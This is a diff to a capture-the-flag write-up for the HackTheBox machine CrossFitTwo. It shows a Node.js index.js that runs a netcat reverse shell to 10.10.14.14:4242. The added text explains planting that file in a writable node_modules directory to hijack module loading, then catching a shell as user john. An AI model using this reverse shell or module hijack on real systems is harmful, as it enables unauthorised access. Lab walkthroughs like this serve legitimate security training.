@@ -1027,7 +1027,26 @@ Let's create new file ```index.js``` with [OpenBSD Reverse Shell](https://github
 require("child_process").execSync('rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4242 >/tmp/f');
 ```
 
-Locate this file on directory that we have permission to write as group which is ```/opt/sysadmin/```, Let's create inside directories ```/node_modules/ws```:
+By running ```module.paths``` on ```node``` console we can see the following paths:
+```console
+crossfit2:sysadmin {10} node
+Welcome to Node.js v12.16.1.
+Type ".help" for more information.
+> module.paths
+[
+  '/opt/sysadmin/repl/node_modules',
+  '/opt/sysadmin/node_modules',
+  '/opt/node_modules',
+  '/node_modules',
+  '/home/david/.node_modules',
+  '/home/david/.node_libraries',
+  '/opt/lib/node',
+  '/opt/lib/node_modules'
+]
+> 
+```
+
+Because we have ```write``` permission on ```/opt/sysadmin/``` we can locate the reverse shell file on ```/opt/sysadmin/node_modules``` directory:
 ```console
 crossfit2:node_modules {74} pwd
 /opt/sysadmin/node_modules
@@ -1035,7 +1054,7 @@ crossfit2:node_modules {74} ls
 index.js
 ```
 
-Listen to port 4242 using ```nc```, Wait 1 min and we will get reverse shell as ```john``` user:
+Listen to port 4242 using ```nc```, Wait 1 min and we will get a reverse shell as ```john``` user:
 ```console
 ┌─[evyatar@parrot]─[/hackthebox/CrossFitTwo/]
 └──╼ $ nc -lvp 4242
